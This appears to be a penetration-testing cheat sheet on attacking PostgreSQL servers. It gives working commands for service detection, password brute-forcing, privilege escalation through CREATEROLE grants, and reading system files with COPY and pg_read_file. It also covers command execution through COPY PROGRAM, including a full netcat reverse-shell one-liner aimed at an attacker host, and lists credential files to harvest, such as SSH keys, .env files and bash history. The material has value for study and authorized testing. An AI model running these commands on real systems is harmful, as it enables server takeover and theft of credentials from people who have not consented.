**PostgreSQL** is an object-relational database system widely used in enterprise and web environments. It supports advanced SQL features, custom functions, file operations (depending on privileges), and system-level integrations.

In pentesting scenarios, PostgreSQL becomes particularly interesting when misconfigured, exposed, or when the database user has elevated privileges such as `SUPERUSER`, `CREATEROLE`, or membership in server file execution groups.

Default port is `5432`, although instances may shift to `5433` if the default is occupied.

---

## Service Detection and Access

PostgreSQL can be identified using Nmap scripts that enumerate version, authentication methods, and sometimes misconfigurations.

```bash
nmap -p 5432 --script pgsql-info <target>
```

Brute-force attempts are possible when authentication is exposed:

```bash
nmap -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=pass.txt <target>
```

Remote access using `psql`:

```bash
psql -h <host> -U <username> -d <database>
psql -h <host> -p 5432 -U <username> -W <database>
```

---

## Basic Interaction and Enumeration

Once inside PostgreSQL, enumeration focuses on databases, roles, schemas, and privileges.

```sql
\l                        -- list databases
\c db_name                -- connect to database
\dt                       -- list tables
\du                       -- list roles/users
\dn+                      -- list schemas
SELECT * FROM table_name; -- select content from table
\q                        -- exit
```

Useful system queries:

```sql
SELECT user;
SELECT current_database();
SELECT datname FROM pg_database;
```

---

## Roles and Privilege Model

PostgreSQL roles define both users and groups. The same role can act as login user and permission container.

Important attributes:

- `rolsuper` → superuser privileges
    
- `rolcreaterole` → can create/manage roles
    
- `rolcreatedb` → can create databases
    
- `rolcanlogin` → allows authentication
    
- `rolreplication` → replication privileges
    

Check roles:

```sql
\du
```

Advanced view:

```sql
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin
FROM pg_roles;
```

Check superuser status:

```sql
SELECT current_setting('is_superuser');
```

---

## Interesting Privilege Groups

Certain built-in PostgreSQL groups provide powerful capabilities:

- `pg_execute_server_program` → allows OS command execution via COPY PROGRAM
    
- `pg_read_server_files` → allows reading arbitrary files
    
- `pg_write_server_files` → allows writing files to filesystem
    

Privilege escalation may be possible if `CREATEROLE` exists:

```sql
GRANT pg_execute_server_program TO username;
GRANT pg_read_server_files TO username;
GRANT pg_write_server_files TO username;
```

---

## File System Access (Read Files)

If the user has sufficient privileges (superuser or `pg_read_server_files`), PostgreSQL can interact with the filesystem.

### COPY-based file read

```sql
CREATE TABLE demo(t text);
COPY demo FROM '/etc/passwd';
SELECT * FROM demo;
```

### Direct file functions (if allowed)

```sql
SELECT pg_ls_dir('/tmp');
SELECT pg_read_file('/etc/passwd', 0, 100000);
```

Check function permissions:

```sql
\df+ pg_read_file
```

---

## RCE via COPY PROGRAM

When the user is superuser or belongs to `pg_execute_server_program`, PostgreSQL can execute system commands.

### Basic proof of concept

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);

COPY cmd_exec FROM PROGRAM 'id';

SELECT * FROM cmd_exec;
```

Result is command output stored inside the table.

To obtain a reverse shell you can use:
```sql
CREATE TABLE shell(output text);

COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <attacker_port> >/tmp/f';
```


---

## Common Credential Locations (Practical Enumeration)

When RCE or file read is available, focus on:

### System users

```bash
/home/<user>/
```

### SSH keys

```bash
/home/<user>/.ssh/id_rsa
/home/<user>/.ssh/authorized_keys
```

### Application configs

```bash
/var/www/html/.env
/var/www/html/config.php
/opt/*
```

### Command history

```bash
/home/<user>/.bash_history
```

### PostgreSQL configs

```bash
/etc/postgresql/11/main/pg_hba.conf
/etc/postgresql/11/main/postgresql.conf
```

---

## Role Escalation and Abuse

If `CREATEROLE` is available, attackers may escalate privileges by assigning powerful groups:

```sql
GRANT pg_read_server_files TO username;
GRANT pg_execute_server_program TO username;
```

This can convert limited SQL access into full OS-level compromise.
